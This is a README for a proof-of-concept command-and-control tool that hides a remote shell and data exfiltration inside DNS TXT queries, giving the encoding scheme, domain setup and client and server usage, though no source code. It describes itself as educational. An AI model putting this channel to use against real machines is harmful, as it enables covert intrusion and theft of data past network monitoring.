# C2oDNS
## Command&Control channel over DNS protocol
This is PoC of the communication channel implemented over DNS protocol. It utilizes a typical client-server architecture. The client is written in C and for now, is only Linux compatible. The server is a python script. 

## Operating principle
A quick refresher on the DNS protocol: its main goal is to **translate a human-friendly domain name into the IP address**. When a device wants to perform this translation, a DNS query is sent to a recursive DNS server. Thanks to the hierarchical structure of DNS servers, this query can travel across multiple DNS servers until it finds an authoritative server of a domain. And if the answer for our query isn't cached anywhere along the way, the query will always hit the domain's authoritative server. The fun begins when we are in a possession of a domain and configure it in such a way, that the authoritative DNS server for this domain is under our control. Then when somebody asks for the address of our subdomain, **a DNS query is forwarded to our server**. In normal conditions we would just return some IP address, but not this time. That query was prepared by the client application and instead of normal subdomains, **it contains some encoded data** (e.g. result of a command execution). To make things even better, DNS queries can not only ask for IP address (type A) but can also for text information (type TXT) that normally would be used for domain ownership verification, email spam prevention, and many more. We can take advantage of this by **sending commands to clients as TXT records**.

## Communication specification 
When the client application is run, it sends TXT queries to a specified domain (e.g. *a.example.com*) with added additional (base32 encoded) information (*info_block*) as subdomain.
```
info_block.a.example.com   TXT?
     ^
     |__________________
      8 bytes of base32
```
When decoded, this information block consists of 5 bytes. The first 2 bytes are "junk" - random value generated for each request. Its purpose is to prevent using cached DNS records because that would resolve our query before it could hit our server. The next byte is client ID - a value given at the launch of the client application (or randomized if not specified). It's used to differentiate multiple clients from the server side. Ultimately MAC address should be used. The last 2 bytes hold message ID. There are two special IDs: HELLO (0xFFFF) and END_OF_TRANSMISSION (0xFFFE). HELLO ID is used when a client is ready to receive a command from the server, and END_OF_TRANSMISSION means that client sent the whole data. When data doesn't fit in a single query then message ID is used to tag queries and later stitch them together on the server side in proper order. That means that a maximum of 65534 messages can be sent as one transaction. By default 189 bytes of data is sent in one query, so only `65534 * 189B ≈ 12MB`can be sent in a single transaction. Data to send is encoded in base32 (12MB of base32 ≈ 8MB of raw data) and added to the domain name as subdomains (max 63 bytes each).
```
data1.data2.data3.info_block.a.example.com   TXT?
```
For every query that hits the server, a proper response is generated (empty data for TXT or server's public IP for A) to prevent queries retransmission and to inform the client that the data has reached the server. When the client is in the middle of sending some data and it doesn't receive an acknowledgment, data transmission is canceled.  

![Communication sequence diagram](https://i.imgur.com/f2ZHvMN.png)

## Setup for educational purposes
1. Obtain a domain (suppose it's *example.com*)
2. Obtain a server with public IP address
3. Cofnigure your domain
    ```
    Example:
    a.example.com   NS  ns.example.com
    ns.example.com  A   XXX.XXX.XXX.XXX <- server's IP address
    ```
4. Compile *client.c* and run **ON YOUR MACHINE**
    ```
    make && ./client a.example.com client_id
    ```
5. Run *server.py* on your server 

## Config and usage of applications
### `client.c`

Run by giving your domain and client_id as arguments. Client_id is optional but recommended. If no client_id is specified, a random value is picked. 
```
./client a.example.com client_id [0-255][optional]
```

Config options (by editing `#define` in source file):
- PORT_NUMBER - socket port number
- DATA_PART_LENGTH - number of bytes of data to attach to the domain name, the maximum length of the result is 255 characters
- DEAD_SERVER_HELLO_INTERVAL_IN_SEC - number of seconds between hello messages if the server doesn't respond
- ALIVE_SERVER_HELLO_INTERVAL_IN_SEC - number of seconds between hello messages if the server responds

### `server.py`
This script provides two functions: `list-clients` and `command-and-control`. 
The first passively listens for client activity and lists them along with the client ID and the time of the last query. The other function launches shell to the specified client.   
```
user$ python3 server.py list-clients --help
Usage: server.py list-clients [OPTIONS]

Options:
  -d, --domain TEXT     Domain name
  -s, --socket-ip TEXT  IP of the interface to run the DNS server on
  -p, --port INTEGER    Custom port number  [default: 53]
  --help                Show this message and exit.
```
![list-clients](https://i.imgur.com/zfFdDFO.png)


```
user$ python3 server.py command-and-control --help
Usage: server.py command-and-control [OPTIONS]

Options:
  -d, --domain TEXT        Domain name
  -s, --socket-ip TEXT     IP of the interface to run the DNS server on
  -c, --client-id INTEGER  ID of the client to control
  -p, --port INTEGER       Custom port number  [default: 53]
  --debug
  --help                   Show this message and exit.
```
![command-and-control](https://i.imgur.com/8d8sFDt.png)

## TODO
- Client for Windows
- Using MAC address as a client ID 

## Licence
MIT
